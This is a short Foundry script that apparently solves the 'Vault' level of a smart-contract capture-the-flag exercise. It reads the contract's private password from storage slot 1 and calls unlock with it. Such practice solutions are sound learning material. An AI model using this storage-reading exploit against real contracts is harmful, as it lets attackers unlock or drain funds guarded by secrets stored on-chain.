// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Vault} from "../src/08_Vault.sol";
import {Script, console} from "forge-std/Script.sol";

contract VaultSolve is Script {
    Vault vault = Vault(0xceE5ca37128AbAE8B67A33C814FCD6866C132512);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Before#", vault.locked());
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        vault.unlock(password);
        console.log("After#", vault.locked());

        vm.stopBroadcast();
    }
}
